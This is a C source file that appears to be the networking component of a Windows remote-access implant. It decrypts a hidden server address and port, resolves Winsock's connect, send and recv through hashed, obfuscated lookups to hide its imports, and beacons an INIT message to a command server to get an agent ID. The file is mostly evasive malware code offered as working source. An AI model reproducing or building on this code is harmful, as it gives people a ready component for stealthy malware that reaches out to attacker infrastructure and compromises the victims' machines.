#pragma comment(lib, "Ws2_32.lib")
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include <stdio.h>
#include "socketManager.h"
#include "../message/Message.h"
#include "../Definitions.h"
#include "../importer/Importer.h"
#include "../crypto/Crypto.h"

MESSAGE INIT_MESSAGE = {
    .payload = (PBYTE)"INIT",
    .size = sizeof("INIT"),
    .type = INIT_TYPE 
}; 

void initSocketManager(PSOCKET_MANAGER pSockManager)
{
    /* INITIALIZE WINDOWS SOCKET STRUCTURES*/
    WSADATA wsaData = {0};
    int sStartUp = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (sStartUp != 0)
    {
        printf("[-] Socket initialization failed -> %i\n", sStartUp);
        return;
    }

    /* CREATING A WINDOWS SOCKET */
    SOCKET sock = INVALID_SOCKET;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        printf("[-] Socket creation failed -> 0x%i\n", WSAGetLastError());
        return;
    }

    DWORD serverStrLength = frombase64GetLength(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN));
    PBYTE serverBlob = fromBase64GetBlob(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN), serverStrLength);
    PCSTR server =  (PCSTR)encrypt(serverBlob, serverStrLength);

    DWORD portStrLength = frombase64GetLength(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER));
    PBYTE portBlob = fromBase64GetBlob(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER), portStrLength);
    PCSTR portStr =  (PCSTR)encrypt(portBlob, portStrLength);
    u_short port = atoi(portStr);

    struct sockaddr_in sockAddr =
    {
        .sin_family = AF_INET, 
        .sin_port = htons(port)
    };

    if (inet_pton(AF_INET, server, &sockAddr.sin_addr) != 1)
    {
        printf("[-] inet_pton failed -> %i\n", WSAGetLastError());
        return;
    };

    /* CONNECTION TO THE SERVER */

    /* OBTAIN OBFUSCTED FUNCTION */
    typedef NTSTATUS(WINAPI* ConnectTominic)(
		SOCKET      s,
		const struct sockaddr *name,
		int         namelen
	);
    ConnectTominic connectToMinic =  (ConnectTominic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_CONNECT_FUNCTION);
    if (connectToMinic(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
    {
        printf("[-] connect failed -> %i\n", WSAGetLastError());
        return;
    };

    printf("[+] Socket successfully intialized...\n");
    SOCKET_MANAGER sManager = {
        .port = port,
        .server = server,
        .s = sock
    };

    /* SENDING INITIAL MESSAGE TO SERVER */
    pSockManager = &sManager;
    sendMessage(pSockManager, &INIT_MESSAGE);
    MESSAGE message = {0};
    receiveMessage(pSockManager, &message);
    DWORD agentId = (message.payload[0] << 24) | (message.payload[1] << 16) | (message.payload[2] << 8) | (message.payload[3]);
    printf("My agent id is -> %u", agentId);
}

BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
{
    /* INITIALIZE SIZE VARIABLES */
    DWORD size = message->size;
    DWORD sizeToAlloc = size + sizeof(DWORD) + 1; // sizeToAlloc is -> size of the payload + size of a DWORD + SIZE of a char
    /*
    INITIALIZE BUFFER TO SEND WHOLE MESSAGE
    ------------------------------------------
     ------    -------    ------------------- 
    | TYPE |  | PSIZE |  |      PAYLOAD      |
     ------    -------    -------------------
     1 Byte    4 Bytes        PSIZE Bytes
    ------------------------------------------
                  sizeToAlloc
    */
    char* data = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeToAlloc);
    if (data == NULL)
    {
        printf("[-] VirtualAlloc failed %li", GetLastError());
        return FALSE;
    }
    
    memcpy(data, &message->type, sizeof(char));
    memcpy((data + 1), &size, sizeof(DWORD));
    memcpy((data + 1 + sizeof(DWORD)), message->payload, size);

    /* OBTAIN OBFUSCTED FUNCTION */
    typedef NTSTATUS(WINAPI* SendToMinic)(
		SOCKET      s,
		char*       buffer,
		int         len,
        int         flags
	);
    SendToMinic sendToMinic =  (SendToMinic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_SEND_FUNCTION);
    sendToMinic(sManager->s, data, sizeToAlloc, 0);
    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, data);
    return TRUE;
}

void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
{   
    /* OBTAIN OBFUSCTED FUNCTION */
    typedef NTSTATUS(WINAPI* RecvFromMinic)(
		SOCKET      s,
		char*       buffer,
		int         len,
        int         flags
	);
    RecvFromMinic recvFromMinic =  (RecvFromMinic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE,  HASH_RECV_FUNCTION);

    /* READING ONE BYTE FOR MESSAGE TYPE */
    char responseType = 0x0;
    if (recvFromMinic(sManager->s, &responseType, sizeof(char), 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };
    
    /* READING PSIZE_FIELD_SIZE BYTES FOR MESSAGE PAYLOAD SIZE FIELD */
    char size[4];
    if (recvFromMinic(sManager->s, size, PSIZE_FIELD_SIZE, 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };

    /* READING payloadSize BYTES FOR MESSAGE PAYLOAD */
    DWORD payloadSize = (size[0] << 24) | (size[1] << 16) | (size[2] << 8) | (size[3]);
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
    if (recvFromMinic(sManager->s, buffer, payloadSize, 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };

    message->payload = (PBYTE)buffer;
    message->size = payloadSize;
    message->type = responseType;
}

BOOL destroySocketManager(PSOCKET_MANAGER pSockManager)
{
    return TRUE;
};